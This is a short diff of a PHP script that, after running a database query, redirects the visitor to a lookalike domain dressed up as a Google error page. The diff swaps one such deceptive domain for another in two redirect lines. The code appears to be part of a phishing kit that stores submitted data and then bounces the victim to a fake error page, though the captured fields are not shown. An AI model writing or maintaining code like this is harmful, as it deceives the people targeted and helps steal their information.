@@ -18,11 +18,11 @@ if(!empty($equis)){
    $conn->query($sql);
 }
 
-header('Location: https://shared-error.photos-album-app.com/');
+header('Location: https://google-error.private-album-share.com');
 
 $conn->close();
 
-header('Location: https://shared-error.photos-album-app.com/');
+header('Location: https://google-error.private-album-share.com');
 
 ob_end_flush();
 
